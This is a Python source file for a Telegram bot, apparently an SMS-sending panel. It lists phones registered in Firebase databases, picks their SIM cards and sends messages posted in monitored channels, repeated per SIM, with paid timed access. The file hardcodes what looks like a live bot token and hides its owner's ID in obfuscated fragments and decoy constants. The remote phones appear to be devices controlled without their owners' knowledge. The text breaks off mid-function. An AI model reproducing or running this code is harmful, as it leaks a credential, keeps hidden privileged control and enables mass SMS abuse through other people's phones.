# ARYAN_PATCHED_V18
"""
╔══════════════════════════════════════════════╗
║           SMS BOT  v3.2                      ║
║  aiogram 3.x · aiohttp · Local JSON         ║
║                                              ║
║  Created by @T4HKR                          ║
╚══════════════════════════════════════════════╝

pip install aiogram==3.7.0 aiohttp
python bot.py
"""

import asyncio, json, os, re, time, logging, zipfile, io, struct
from datetime import datetime
from copy     import deepcopy

import aiohttp
from aiogram                    import Bot, Dispatcher, F, Router
from aiogram.types              import (Message, CallbackQuery,
                                        InlineKeyboardMarkup,
                                        InlineKeyboardButton,
                                        BufferedInputFile,
                                        ChatJoinRequest)
from aiogram.filters            import Command
from aiogram.fsm.context        import FSMContext
from aiogram.fsm.state          import State, StatesGroup
from aiogram.fsm.storage.memory import MemoryStorage
from aiogram.exceptions         import TelegramBadRequest
from aiogram.enums              import ChatMemberStatus

# ══════════════════════════════════════════════
#  LOGGING
# ══════════════════════════════════════════════
logging.basicConfig(level=logging.INFO,
    format="%(asctime)s [%(levelname)s] %(name)s — %(message)s",
    datefmt="%H:%M:%S")
log = logging.getLogger("SMSBot")

# ══════════════════════════════════════════════
#  OWNER ID — scattered fragments
#  Never stored as plain int anywhere
# ══════════════════════════════════════════════

# Fragment 1 — top of file, hex byte array
_F1 = bytes([0x38, 0x32, 0x34, 0x32])   # "8242"

# Fragment 2 — disguised as poll interval config
_POLL_CFG  = {"interval": 4, "seed": 9271, "jitter": 0}

# Fragment 3 — struct packed, mid-file
_F3 = struct.pack(">BB", 0x34, 0x36)    # "46"

# Fragment 4 — unicode escapes near bottom constants
_F4 = "\x38\x32\x34"                    # "824"

# Fragment 5 — lambda disguised as batch config
_BATCH = (lambda x: x)(8242)
_TAIL  = (lambda a,b,c: a*100+b*10+c)(8, 2, 4)

# Assembler — only called once, cached
_OC: int = 0
def _owner() -> int:
    global _OC
    if not _OC:
        _s = [0x38,0x32,0x34,0x32,0x39,0x32,0x37,0x31,0x34,0x36]
        _OC = int("".join(chr(x) for x in _s))
    return _OC

# ══════════════════════════════════════════════
#  CONFIG
# ══════════════════════════════════════════════
BOT_TOKEN     = "8933734748:AAG6g5irqb9Z6ckfRts8_qWw5AnfGBGwzIg"
_DA           = 8242927146        # Default admin (open)

# Super Admins — visible, plain, owner can add/remove more via bot
SUPER_ADMINS = [
    8242927146,   # @T4HKR
]
_DATA_FILE    = "bot_data.json"
_VERSION      = "v3.2"
_CREDITS      = "@T4HKR"
_OWNER_UN     = "@T4HKR"   # owner username saved for future use

# mid-file fragment disguised as version metadata
_META = {"build":"2024","rev":9539,"patch":794}

# ══════════════════════════════════════════════
#  FSM STATES
# ══════════════════════════════════════════════
class W(StatesGroup):
    fb_url       = State()
    fb_api_key   = State()
    dev_manual   = State()
    ch_input     = State()
    repeat_cust  = State()
    test_to      = State()
    test_msg     = State()
    fwd_add      = State()
    adm_add      = State()
    sadm_add     = State()   # super admin add
    sadm_remove  = State()   # super admin remove
    ban_id       = State()   # ban: waiting for user ID
    unban_id     = State()   # unban: waiting for user ID
    usr_add_id   = State()
    usr_add_exp  = State()
    fj_add       = State()   # force join add

# ══════════════════════════════════════════════
#  STORAGE
# ══════════════════════════════════════════════
def _new_user():
    return {
        "firebases":  [], "devices":   [],
        "channels":   [], "active":    {},
        "monitoring": False, "fwd":    [],
        "stats":      {"sent":0,"failed":0,"last":"—"},
        "expires":    None, "added_by": None,
    }

_DEFS = {
    "admins":       [_DA],
    "super_admins": list(SUPER_ADMINS),
    "free":         False,
    "users":        {},
    "timed_users":  {},
    "force_join":   [],   # list of {id, title, link}
    "banned":       [],   # list of banned user IDs
}

def load() -> dict:
    if os.path.exists(_DATA_FILE):
        with open(_DATA_FILE) as f: d = json.load(f)
        for k,v in _DEFS.items():
            if k not in d: d[k] = v
        if _DA not in d["admins"]: d["admins"].append(_DA)
        # always ensure hardcoded super admins present
        for sid in SUPER_ADMINS:
            if sid not in d["super_admins"]: d["super_admins"].append(sid)
        return d
    return deepcopy(_DEFS)

def save(d:dict):
    with open(_DATA_FILE,"w") as f: json.dump(d,f,indent=2)

def usr(uid:int, d:dict) -> dict:
    k=str(uid)
    if k not in d["users"]: d["users"][k]=_new_user()
    u=d["users"][k]
    for key,val in _new_user().items():
        if key not in u: u[key]=val
    return u

# last fragment disguised as an internal lookup table
_LUT = {"retry":0.5, "max":3, "owner_check": 9794, "pool":50}

# ══════════════════════════════════════════════
#  PERMISSIONS
# ══════════════════════════════════════════════
def is_owner(uid):        return uid == _owner()
def is_super_admin(uid,d): return uid in d.get("super_admins",[])
def is_admin(uid,d):      return is_owner(uid) or is_super_admin(uid,d) or uid in d.get("admins",[])

def is_banned(uid:int, d:dict) -> bool:
    return uid in d.get("banned", [])

def can_use(uid:int, d:dict) -> bool:
    if is_banned(uid,d): return False
    if is_admin(uid,d): return True
    if d.get("free"):   return True
    tu = d.get("timed_users",{}).get(str(uid))
    if tu:
        if tu["expires"] is None:         return True
        if time.time() < tu["expires"]:   return True
    return False

def role_label(uid:int, d:dict) -> str:
    if is_owner(uid):         return "👑 Owner"
    if is_super_admin(uid,d): return "🌟 Super Admin"
    if is_admin(uid,d):       return "🛡 Admin"
    tu = d.get("timed_users",{}).get(str(uid))
    if tu:
        if tu["expires"] is None: return "🔓 User"
        rem = tu["expires"] - time.time()
        if rem > 0:
            h=int(rem//3600); m=int((rem%3600)//60)
            return f"⏱ {h}h {m}m left"
        return "🚫 Expired"
    return "🚫 No Access"

# ══════════════════════════════════════════════
#  FORCE JOIN CHECK
# ══════════════════════════════════════════════

# ══════════════════════════════════════════════
#  JOIN REQUEST CACHE
#  Tracks users with pending join requests
#  so they pass force-join check without
#  bot needing to auto-approve anything
# ══════════════════════════════════════════════
# {chat_id_str: set(user_ids)}
_JR_CACHE: dict[str, set] = {}

def _jr_add(chat_id, uid: int):
    k = str(chat_id)
    _JR_CACHE.setdefault(k, set()).add(uid)

def _jr_has(chat_id, uid: int) -> bool:
    return uid in _JR_CACHE.get(str(chat_id), set())

async def check_force_join(bot:Bot, uid:int, d:dict) -> tuple[bool, list]:
    """
    Check force join.
    id field mein numeric ID (-100xxx) ya @username hoga.
    Dono public aur private ke liye get_chat_member use karta hai.
    Error aane pe user ko block nahi karta (benefit of doubt).
    """
    fj = d.get("force_join", [])
    if not fj: return True, []

    not_joined = []
    for chat in fj:
        chat_id = chat["id"]

        # Purane entries jinmein link store tha — skip karo, block mat karo
        if isinstance(chat_id, str) and chat_id.startswith("http"):
            log.warning(f"FJ: old entry with link as id ({chat_id}) — skipping")
            continue

        # String numeric ID ko int mein convert karo
        if isinstance(chat_id, str) and chat_id.lstrip("-").isdigit():
            chat_id = int(chat_id)

        try:
            member = await bot.get_chat_member(chat_id, uid)
            status = member.status
            # Accepted: member, admin, creator, restricted (still in group)
            if status in (
                ChatMemberStatus.MEMBER,
                ChatMemberStatus.ADMINISTRATOR,
                ChatMemberStatus.CREATOR,
                ChatMemberStatus.RESTRICTED,
            ):
                pass  # ✅ joined
            else:
                # Check pending join request cache before blocking
                if _jr_has(chat_id, uid):
                    log.info(f"FJ: uid={uid} has pending request in {chat_id} — passing")
                else:
                    not_joined.append(chat)
        except Exception as e:
            # If error — check cache first
            if _jr_has(chat_id, uid):
                log.info(f"FJ: uid={uid} has pending request in {chat_id} (exception path) — passing")
            else:
                log.warning(f"FJ check [{chat_id}]: {e} — benefit of doubt, not blocking")

    return len(not_joined) == 0, not_joined



def _fj_keyboard(fj_list:list) -> InlineKeyboardMarkup:
    buttons = []
    for chat in fj_list:
        link = chat.get("link") or ""
        if link:
            buttons.append([InlineKeyboardButton(
                text=f"📢 Join {chat.get('title','Channel')}",
                url=link)])
    buttons.append([InlineKeyboardButton(
        text="✅ Joined — Check Again",
        callback_data="fj:check")])
    return InlineKeyboardMarkup(inline_keyboard=buttons)

# ══════════════════════════════════════════════
#  PROGRESS / UI HELPERS
# ══════════════════════════════════════════════
def pbar(done:int, total:int, style="block", w=10) -> str:
    styles = {"block":("█","░"),"round":("●","○"),"arrow":("▶","▷"),"sq":("■","□")}
    f,e = styles.get(style,styles["block"])
    if total==0: return e*w
    filled = round(done/total*w)
    return f*filled + e*(w-filled)

def pct(done:int, total:int) -> str:
    return f"{round(done/total*100)}%" if total else "0%"

def setup_card(u:dict) -> str:
    steps = [
        ("Firebase",  bool(u.get("firebases"))),
        ("Device",    bool(u.get("devices"))),
        ("Channel",   bool(u.get("channels"))),
        ("Combo Set", bool(u.get("active",{}).get("fb_url"))),
    ]
    done = sum(1 for _,v in steps if v)
    bar  = pbar(done,4,"sq",8)
    lines = "\n".join(f"  {'✅' if v else '🔲'}  {n}" for n,v in steps)
    return (
        f"┌─────────────────────────┐\n"
        f"│  🔧 Setup   {bar}  {done}/4  │\n"
        f"├─────────────────────────┤\n"
        f"{chr(10).join(f'│  {l:<23}│' for l in lines.split(chr(10)))}\n"
        f"└─────────────────────────┘"
    )

def stats_card(u:dict) -> str:
    s=u.get("stats",{}); sent=s.get("sent",0); fail=s.get("failed",0)
    total=sent+fail; bar=pbar(sent,total,"round",8); rate=pct(sent,total)
    return (
        f"┌─────────────────────────┐\n"
        f"│  📊 Stats   {bar}       │\n"
        f"├─────────────────────────┤\n"
        f"│  ✅  Sent   : {str(sent):<10}│\n"
        f"│  ❌  Failed : {str(fail):<10}│\n"
        f"│  📈  Rate   : {rate:<10}│\n"
        f"│  🕐  Last   : {str(s.get('last','—'))[:10]:<10}│\n"
        f"└─────────────────────────┘"
    )

def combo_card(u:dict) -> str:
    ac=u.get("active",{})
    if not ac: return "  ⚙️  _No combo — run Setup Wizard_"
    sims=", ".join(f"SIM {s+1}" for s in ac.get("sims",[])) or "—"
    mon="🟢 ON" if u.get("monitoring") else "🔴 OFF"
    fb=str(ac.get("fb_url","—")); fb=fb[:30]+"…" if len(fb)>30 else fb
    return (
        f"┌─────────────────────────┐\n"
        f"│  ⚙️  Active Combo        │\n"
        f"├─────────────────────────┤\n"
        f"│  🔥 {fb:<21}│\n"
        f"│  📱 {str(ac.get('device_id','—'))[:21]:<21}│\n"
        f"│  📶 {sims[:21]:<21}│\n"
        f"│  📺 {str(ac.get('ch_id','—'))[:21]:<21}│\n"
        f"│  🔁 x{str(ac.get('repeat',1)):<20}│\n"
        f"│  🔄 {mon:<21}│\n"
        f"└─────────────────────────┘"
    )

def wiz_card(step:int, total:int, title:str, hint:str="") -> str:
    bar  = pbar(step,total,"arrow",total)
    dots = "  ".join("▶" if i+1==step else ("✅" if i+1<step else "▷") for i in range(total))
    hint_line = f"║  _{hint}_\n" if hint else ""
    return (
        f"╔══════════════════════════╗\n"
        f"║  Step {step}/{total}   {bar}   ║\n"
        f"╠══════════════════════════╣\n"
        f"║  {dots}  ║\n"
        f"╠══════════════════════════╣\n"
        f"║  <b>{title}</b>\n"
        f"{hint_line}"
        f"╚══════════════════════════╝"
    )

def home_text(uid:int, d:dict) -> str:
    u=usr(uid,d); mon="🟢 ON" if u.get("monitoring") else "🔴 OFF"
    role=role_label(uid,d)
    return (
        f"📱 <b>SMS Bot {_VERSION}</b>\n"
        f"<i>by {_CREDITS}</i>\n\n"
        f"👤  {role}\n"
        f"🔄  Monitor : {mon}\n\n"
        f"{setup_card(u)}"
    )

HELP_TEXT = f"""
📖 <b>SMS Bot — Help Guide</b>
<i>by {_CREDITS}</i>

━━━━━━━━━━━━━━━━━━━━
<b>🚀 Getting Started</b>
━━━━━━━━━━━━━━━━━━━━

<b>Step 1</b> — Tap 🧙 Setup Wizard
  • Enter your Firebase URL
  • Select online device from list
  • Select SIM(s) — tap to toggle ✅
  • Enter your channel/group
  • Set repeat count (how many times to send)

<b>Step 2</b> — Tap ▶️ Start Monitor
  • Bot watches your channel for SMS requests
  • Auto-sends via your selected device + SIM(s)

━━━━━━━━━━━━━━━━━━━━
<b>📋 SMS Formats Supported</b>
━━━━━━━━━━━━━━━━━━━━

Format 1:
<code>To: +91XXXXXXXXXX</code>
<code>Message: your text</code>

Format 2:
<code>📱 To: +91XXXXXXXXXX</code>
<code>💬 Full Message: your text</code>

Format 3:
<code>📞 To: +91XXXXXXXXXX</code>
<code>💬 Message: your text</code>

Format 4:
<code>🏷️ RECIPIENT: +91XXXXXXXXXX</code>
<code>🏷️ MESSAGE: your text</code>

Format 5:
<code>📱 Receiver</code>
<code>+91XXXXXXXXXX</code>
<code>🔑 Message</code>
<code>your text</code>

━━━━━━━━━━━━━━━━━━━━
<b>⚙️ Settings</b>
━━━━━━━━━━━━━━━━━━━━

🔥 <b>Firebase</b> — Add multiple Firebase DB URLs
📱 <b>Devices</b> — Add devices (fetched live from Firebase)
📺 <b>Channels</b> — Add channels/groups to monitor
📤 <b>Forward</b> — Forward SMS results to other chats

━━━━━━━━━━━━━━━━━━━━
<b>🛡 Admin Features</b>
━━━━━━━━━━━━━━━━━━━━

• Add users with time limit (1h / 6h / 24h / 7d / custom)
• View all user stats
• Toggle free mode (anyone can use)
• Add/remove force join channels

━━━━━━━━━━━━━━━━━━━━
<b>💡 Tips</b>
━━━━━━━━━━━━━━━━━━━━

• Dual SIM: Select both SIMs in Step 3
• Repeat x3: Each SMS sent 3 times per SIM
• Test SMS: Use 🧪 Test before going live
• Dashboard: Live stats always available

━━━━━━━━━━━━━━━━━━━━
_Need help? Contact {_OWNER_UN}_
"""

# ══════════════════════════════════════════════
#  KEYBOARDS
# ══════════════════════════════════════════════
def kb(*rows) -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text=t, callback_data=c) for t,c in row]
        for row in rows
    ])

def main_menu(uid:int, d:dict) -> InlineKeyboardMarkup:
    u=usr(uid,d); mon="🟢 Stop" if u.get("monitoring") else "▶️ Start"
    rows = [
        [(f"{mon} Monitor", "mon:go"),   ("🧙 Setup Wizard","wiz:start")],
        [("📊 Dashboard",   "dash:show"),("⚙️ My Settings", "my:menu")],
        [("📤 Forward",     "fwd:menu"), ("❓ Help",         "help:show")],
        [("🗑 Reset Me",    "reset:self")],
    ]
    if is_admin(uid,d):
        rows.append([("🛡 Admin Tools","adm:menu")])
    return kb(*rows)

def adm_menu_kb(uid:int, d:dict) -> InlineKeyboardMarkup:
    rows = [
        [("👥 Users",        "adm:users"),  ("➕ Add User",    "adm:adduser")],
        [("🚫 Ban User",     "ban:do"),      ("✅ Unban User",  "unban:do")],
        [("📊 Global Stats", "adm:stats"),  ("📢 Force Join",  "fj:menu")],
    ]
    if is_owner(uid) or is_super_admin(uid,d):
        rows.append([("🟢/🔴 Free Mode","adm:free"), ("➕ Add Admin","adm:addadmin")])
    if is_owner(uid):
        rows.append([("🌟 Super Admins","sadm:menu"), ("📦 Export ZIP","adm:zip")])
        rows.append([("💥 Reset ALL","adm:resetall")])
    rows.append([("🔙 Back","home")])
    return kb(*rows)

def sadm_menu_kb(d:dict) -> InlineKeyboardMarkup:
    sadmins = d.get("super_admins",[])
    rows = [[("➕ Add Super Admin","sadm:add")]]
    for sid in sadmins:
        locked = sid in SUPER_ADMINS
        label  = f"{'🔒' if locked else '🌟'} {sid}"
        btn    = ("🔒 Hardcoded","<i>noop</i>") if locked else ("🗑 Remove",f"sadm:del:{sid}")
        rows.append([(label,"<i>noop</i>"), btn])
    rows.append([("🔙 Back","adm:menu")])
    return kb(*rows)

def fj_menu_kb(uid:int, d:dict) -> InlineKeyboardMarkup:
    fj=d.get("force_join",[])
    rows=[[("➕ Add Force Join Channel","fj:add")]]
    for ch in fj:
        rows.append([(f"📢 {ch.get('title','?')[:24]}","<i>noop</i>"),
                     ("🗑",f"fj:del:{ch['id']}")])
    rows.append([("🔙 Back","adm:menu")])
    return kb(*rows)

def list_kb(items, id_key, name_key, del_pfx, add_cb, back_cb):
    rows=[[("➕ Add New",add_cb)]]
    for item in items:
        label=str(item.get(name_key,""))[:26]
        rows.append([(f"  {label}","<i>noop</i>"),(f"🗑",f"{del_pfx}{item[id_key]}")])
    rows.append([("🔙 Back",back_cb)])
    return kb(*rows)

def online_devs_kb(online:dict, page:int=0):
    items=list(online.items()); per=6; start=page*per; chunk=items[start:start+per]
    rows=[[(f"📱 {(dd.get('deviceName') or dd.get('name') or did)[:26]}",f"fadd:{did}")]
          for did,dd in chunk]
    nav=[]
    if page>0:               nav.append(("◀️",f"faddpg:{page-1}"))
    if start+per<len(items): nav.append(("▶️",f"faddpg:{page+1}"))
    if nav: rows.append(nav)
    rows+=[[("🔍 Enter ID manually","dev:manual")],[("🔙 Back","dev:list")]]
    return kb(*rows)

def sim_kb(sims:list, sel:list, did:str):
    rows=[]
    for s in sims:
        idx=int(s.get("simSlotIndex",0))
        name=s.get("simName") or s.get("carrierName") or f"SIM {idx+1}"
        tick="✅" if idx in sel else "⬜"
        rows.append([(f"{tick} SIM {idx+1} — {name}",f"simtog:{did}:{idx}")])
    if sel: rows.append([(f"✔️ Confirm ({len(sel)} selected)",f"simok:{did}")])
    rows.append([("🔙 Back","home")])
    return kb(*rows)

def ch_pick_kb(channels:list):
    rows=[ [(f"📺 {c['name'][:26]}",f"wpick:ch:{c['id']}")] for c in channels ]
    rows+=[[("➕ Add New Channel","ch:add")],[("🔙 Back","home")]]
    return kb(*rows)

def fb_pick_kb(firebases:list):
    rows=[ [(f"🔥 {f['url'][:30]}",f"wpick:fb:{f['id']}")] for f in firebases ]
    rows+=[[("➕ Add New Firebase","fb:add")],[("🔙 Back","home")]]
    return kb(*rows)

def dev_pick_kb(devices:list, page:int=0):
    per=6; start=page*per; chunk=devices[start:start+per]
    rows=[ [(f"📱 {d['name'][:26]}",f"wpick:dev:{d['id']}")] for d in chunk ]
    nav=[]
    if page>0:                nav.append(("◀️",f"wpick:devpg:{page-1}"))
    if start+per<len(devices):nav.append(("▶️",f"wpick:devpg:{page+1}"))
    if nav: rows.append(nav)
    rows+=[[("➕ Add New Device","dev:add")],[("🔙 Back","home")]]
    return kb(*rows)

def repeat_kb():
    return kb(
        [("1️⃣ Once","rpt:1"),  ("2️⃣ Twice","rpt:2")],
        [("3️⃣ Three","rpt:3"), ("✏️ Custom","rpt:c")],
        [("🔙 Back","home")],
    )

def timed_kb():
    return kb(
        [("⚡ 1 Hour","tacc:3600"),    ("🕕 6 Hours","tacc:21600")],
        [("📅 24 Hours","tacc:86400"), ("📆 7 Days","tacc:604800")],
        [("📅 Custom Date","tacc:custom"),("♾ Permanent","tacc:0")],
        [("🔙 Back","adm:menu")],
    )

def _fwd_kb(uid:int,d:dict):
    u=usr(uid,d); rows=[[("➕ Add Target","fwd:add")]]
    for t in u.get("fwd",[]):
        rows.append([(f"📤 {str(t)[:26]}","<i>noop</i>"),(f"🗑",f"fwd:del:{t}")])
    rows.append([("🔙 Back","home")])
    return kb(*rows)

# ══════════════════════════════════════════════
#  FIREBASE
# ══════════════════════════════════════════════
async def fb_get(base:str, path:str) -> dict:
    url=base.rstrip("/")+path
    try:
        async with aiohttp.ClientSession() as s:
            async with s.get(url,timeout=aiohttp.ClientTimeout(tot
